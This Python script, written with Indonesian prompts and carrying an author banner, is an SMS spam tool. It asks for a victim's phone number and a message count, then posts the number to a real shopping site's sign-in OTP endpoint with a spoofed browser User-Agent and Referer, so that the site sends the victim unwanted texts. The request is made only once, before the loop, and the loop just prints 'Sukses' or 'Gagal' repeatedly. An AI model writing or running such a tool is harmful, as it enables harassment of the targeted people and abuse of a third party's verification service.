import os, sys, time, requests
from requests import post
def lagi():
	l = input('Mau Spam Lagi? [y/n] : ')
	if l == 'y':
		main()
	elif l == 'n':
		sys.exit()

def main():
	os.system('clear')
	banner = '''
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ஜ۩۞۩ஜ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
Author   : Randiansyah
Facebook : Rendi Saputra
Github   : https://github.com/Rendi-ID
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
'''
	print(banner)
	no = input('Nomor Target : ')
	jml = int(input('jumlah spam : '))

	ua = {
	'Connection': 'keep-alive',
	'User-Agent': "Mozilla/5.0 (Linux; Android 5.1; A1603) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
	'Referer': 'https://www.mapclub.com/en/user/signup',
	}

	dat = {
	'phone': no,
	}

	sendSms = requests.post('https://cmsapi.mapclub.com/api/signin-otp', data=dat, headers=ua, )
	for x in range(jml):
		time.sleep(5)
		if 'error' in sendSms.text:
			print('Spam Sms'+ no + ' [ Gagal ]')
		else:
			print('Spam Sms'+ no + ' [ Sukses ]')

main()
lagi()

